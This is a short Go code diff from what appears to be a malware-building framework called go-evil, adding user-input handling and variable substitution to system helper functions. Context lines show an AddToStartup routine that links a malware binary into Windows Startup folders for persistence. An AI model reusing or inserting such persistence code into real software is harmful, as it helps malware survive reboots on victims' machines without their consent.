@@ -8,14 +8,17 @@ import (
 	"runtime"
 
 	"github.com/s9rA16Bf4/go-evil/utility/converter"
+	user_var "github.com/s9rA16Bf4/go-evil/utility/variables/user"
 )
 
 func System_exit(status_lvl string) {
+	status_lvl = user_var.Check_if_variable(status_lvl)
 	value := converter.String_to_int(status_lvl, "system.System_exit()")
 	os.Exit(value)
 }
 
 func System_out(msg string) {
+	msg = user_var.Check_if_variable(msg)
 	fmt.Println(msg)
 }
 
@@ -57,4 +60,10 @@ func AddToStartup() {
 		os.Link(malware_name, "%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")     // Running user
 		os.Link(malware_name, "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") // All users
 	}
+}
+
+func User_input() {
+	var input string
+	fmt.Scanln(&input)           // This takes the user input and puts the result into input
+	user_var.Set_variable(input) // Save the input
 }
